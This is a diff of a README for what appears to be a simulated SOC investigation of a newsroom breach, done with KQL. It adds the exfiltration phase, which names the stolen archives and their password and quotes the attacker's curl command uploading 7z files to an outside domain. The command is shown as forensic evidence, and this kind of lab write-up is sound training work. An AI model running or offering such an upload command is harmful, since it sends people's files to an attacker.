@@ -1,6 +1,6 @@
 # 🛡️ Valdorian Times Cybersecurity Breach: A Real-World SOC Investigation 🧠
 
-🎥 **[Watch Full Investigation Video (kql.mp4)](kql.mp4)**  
+🎥 **[Watch Full Investigation Video (kql.mp4)](https://drive.google.com/file/d/1b-IJ2acGuVvpFf12_vAxgXWQosKQmrU3/view?usp=drive_link)**  
 > A realistic SOC simulation built with KQL, process analysis, phishing forensics, and file exfiltration tracking.
 
 ---
@@ -118,3 +118,48 @@ net view
 ### ➡️ Renamed & Moved
 ```plaintext
 C:\Users\romclovin\Documents\OpEdFinal_to_print.docx
+```
+Timestamp: 2024-01-31T10:26:20.000Z
+
+📧 Sent via Email to Clark Kent: 2024-01-31T11:11:12.000Z
+⏱️ Elapsed Time: 44 minutes
+
+---
+
+## 📦 Phase 6: Data Theft & Exfiltration
+
+### 🗃️ Files Created by the Attacker
+- `DankMemes.7z`
+- `MyStolenDataFromDocuments.7z`
+- `MyStolenDataFromDesktop.7z`
+
+🔐 **Password for All Archives**: `thruthW!llS3tUfree`
+
+### 📤 Exfiltration Command
+```bash
+curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php
+
+```
+🌐 Destination Domain: hirejob.com
+---
+## 📂 Repository Structure
+
+```bash
+Valdorian-Incident-Investigation/
+├── README.md                      # 📝 Project summary and case details
+├── kql.mp4                        # 🎥 Full investigation video
+├── data/
+│   ├── IOC_list.txt               # 📄 IPs, hashes, domains
+│   └── investigation_logs.txt     # 🕵️ Full attack timeline & investigation steps
+├── assets/
+│   └── phishing_flowchart.png     # 🧭 (Optional) Visual representation of phishing chain
+```
+---
+## 🧠 Learnings
+
+✅ **KQL in action**: Real queries across web, DNS, authentication & process logs  
+✅ **Tracking PowerShell scripts and scheduled tasks**  
+✅ **Detecting spear-phishing and content spoofing**  
+✅ **Building incident timelines from metadata**  
+✅ **Reconstructing the attack chain from internal telemetry**
+---------------------------------------------------------------------------------------------------------------
